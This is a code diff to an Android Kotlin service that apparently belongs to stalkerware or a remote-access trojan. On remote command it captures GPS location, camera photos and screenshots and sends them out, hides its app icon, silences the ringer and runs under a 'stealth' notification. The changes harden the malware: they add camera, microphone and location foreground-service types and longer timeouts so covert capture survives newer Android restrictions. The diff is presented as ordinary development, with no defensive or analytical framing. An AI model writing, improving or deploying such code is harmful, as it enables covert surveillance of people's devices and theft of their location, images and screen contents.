@@ -111,7 +111,27 @@ class CommandService : Service() {
 
     private fun startForegroundSilent() {
         val notification = StealthNotificationHelper.createStealthNotification(this)
-        startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification)
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+            try {
+                // Combine all needed foreground types
+                var types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+                   types = types or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                           android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+                           android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                }
+                startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification, types)
+            } catch (e: Exception) {
+                // Fallback: try mostly minimal type if full types fail (e.g. permission missing)
+                try {
+                     startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                } catch (e2: Exception) {
+                     Log.e(TAG, "Failed to start foreground: ${e2.message}")
+                }
+            }
+        } else {
+            startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification)
+        }
     }
 
     @Volatile private var isConnecting = false
@@ -303,7 +323,7 @@ class CommandService : Service() {
                     result.complete(null)
                 }
 
-                val location = withTimeoutOrNull(20000) { result.await() }
+                val location = withTimeoutOrNull(30000) { result.await() }
                 if (location != null) {
                     sendResponse("location", JSONObject().apply {
                         put("latitude", location.latitude)
@@ -315,7 +335,7 @@ class CommandService : Service() {
                         put("timestamp", location.time)
                     })
                 } else {
-                    sendError("Could not get location")
+                    sendError("Could not get location (timeout)")
                 }
             } catch (e: Exception) {
                 sendError("Location error: ${(e.message ?: "Unknown error")}")
@@ -423,6 +443,23 @@ class CommandService : Service() {
         val cameraId = params?.optString("camera_id", "0") ?: "0"
         serviceScope.launch {
             try {
+                if (ContextCompat.checkSelfPermission(this@CommandService, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                    sendResponse("photo", JSONObject().put("error", "CAMERA permission not granted"))
+                    return@launch
+                }
+
+                // Upgrade foreground service type for Android 14+ to allow camera access
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+                    try {
+                        val notification = StealthNotificationHelper.createStealthNotification(this@CommandService)
+                        val type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                        startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification, type)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Failed to upgrade foreground service: ${e.message}")
+                    }
+                }
+
                 val manager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return@launch
                 val characteristics = manager.getCameraCharacteristics(cameraId)
                 val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
@@ -476,7 +513,7 @@ class CommandService : Service() {
                     override fun onError(camera: CameraDevice, error: Int) { camera.close(); result.complete(null) }
                 }, camHandler)
 
-                val photoBytes = withTimeoutOrNull(15000) { result.await() }
+                val photoBytes = withTimeoutOrNull(30000) { result.await() }
                 reader.close()
                 camThread.quitSafely()
 
@@ -1028,23 +1065,32 @@ class CommandService : Service() {
     private fun executeTakeScreenshot() {
         serviceScope.launch {
             try {
-                val screenshotFile = File(externalCacheDir, "screenshot_${System.currentTimeMillis()}.png")
-                val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p", screenshotFile.absolutePath))
-                process.inputStream.close()
-                process.errorStream.close()
-                process.waitFor()
-                process.destroy()
-                
-                if (screenshotFile.exists()) {
-                    val bytes = screenshotFile.readBytes()
-                    val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
-                    sendResponse("screenshot", JSONObject().apply {
-                        put("image_base64", base64)
-                        put("size", bytes.size)
-                    })
-                    screenshotFile.delete()
-                } else {
-                    sendError("Failed to capture screenshot")
+                withTimeout(10000) {
+                    val screenshotFile = File(externalCacheDir, "screenshot_${System.currentTimeMillis()}.png")
+                    val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p", screenshotFile.absolutePath))
+                    
+                    // Handle streams to prevent buffer blocking
+                    process.inputStream.close()
+                    process.errorStream.close()
+                    
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                        process.waitFor(8, java.util.concurrent.TimeUnit.SECONDS)
+                    } else {
+                        process.waitFor()
+                    }
+                    process.destroy()
+                    
+                    if (screenshotFile.exists()) {
+                        val bytes = screenshotFile.readBytes()
+                        val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
+                        sendResponse("screenshot", JSONObject().apply {
+                            put("image_base64", base64)
+                            put("size", bytes.size)
+                        })
+                        screenshotFile.delete()
+                    } else {
+                        sendError("Failed to capture screenshot")
+                    }
                 }
             } catch (e: Exception) {
                 sendError("Screenshot error: ${(e.message ?: "Unknown error")}")
@@ -1218,15 +1264,17 @@ class CommandService : Service() {
     private fun executeHideIcon() {
         serviceScope.launch {
             try {
-                val componentName = ComponentName(this@CommandService, "${packageName}.SetupWizardActivity")
-                packageManager.setComponentEnabledSetting(
-                    componentName,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                )
-                sendResponse("icon_hidden", JSONObject().apply {
-                    put("status", "hidden")
-                })
+                withTimeout(5000) {
+                    val componentName = ComponentName(this@CommandService, "${packageName}.SetupWizardActivity")
+                    packageManager.setComponentEnabledSetting(
+                        componentName,
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP
+                    )
+                    sendResponse("icon_hidden", JSONObject().apply {
+                        put("status", "hidden")
+                    })
+                }
             } catch (e: Exception) {
                 sendError("Hide icon error: ${(e.message ?: "Unknown error")}")
             }
@@ -1236,15 +1284,17 @@ class CommandService : Service() {
     private fun executeShowIcon() {
         serviceScope.launch {
             try {
-                val componentName = ComponentName(this@CommandService, "${packageName}.SetupWizardActivity")
-                packageManager.setComponentEnabledSetting(
-                    componentName,
-                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                    PackageManager.DONT_KILL_APP
-                )
-                sendResponse("icon_shown", JSONObject().apply {
-                    put("status", "visible")
-                })
+                withTimeout(5000) {
+                    val componentName = ComponentName(this@CommandService, "${packageName}.SetupWizardActivity")
+                    packageManager.setComponentEnabledSetting(
+                        componentName,
+                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        PackageManager.DONT_KILL_APP
+                    )
+                    sendResponse("icon_shown", JSONObject().apply {
+                        put("status", "visible")
+                    })
+                }
             } catch (e: Exception) {
                 sendError("Show icon error: ${(e.message ?: "Unknown error")}")
             }
@@ -1256,24 +1306,26 @@ class CommandService : Service() {
         
         serviceScope.launch {
             try {
-                val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return@launch
-                val audioMode = when(mode.lowercase()) {
-                    "normal" -> AudioManager.MODE_NORMAL
-                    "silent" -> AudioManager.RINGER_MODE_SILENT
-                    "vibrate" -> AudioManager.RINGER_MODE_VIBRATE
-                    else -> AudioManager.MODE_NORMAL
+                withTimeout(3000) {
+                    val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return@withTimeout
+                    val audioMode = when(mode.lowercase()) {
+                        "normal" -> AudioManager.MODE_NORMAL
+                        "silent" -> AudioManager.RINGER_MODE_SILENT
+                        "vibrate" -> AudioManager.RINGER_MODE_VIBRATE
+                        else -> AudioManager.MODE_NORMAL
+                    }
+                    
+                    if (mode == "silent" || mode == "vibrate") {
+                        audioManager.ringerMode = audioMode
+                    } else {
+                        audioManager.mode = audioMode
+                    }
+                    
+                    sendResponse("audio_mode_changed", JSONObject().apply {
+                        put("status", "success")
+                        put("mode", mode)
+                    })
                 }
-                
-                if (mode == "silent" || mode == "vibrate") {
-                    audioManager.ringerMode = audioMode
-                } else {
-                    audioManager.mode = audioMode
-                }
-                
-                sendResponse("audio_mode_changed", JSONObject().apply {
-                    put("status", "success")
-                    put("mode", mode)
-                })
             } catch (e: Exception) {
                 sendError("Change audio mode error: ${(e.message ?: "Unknown error")}")
             }
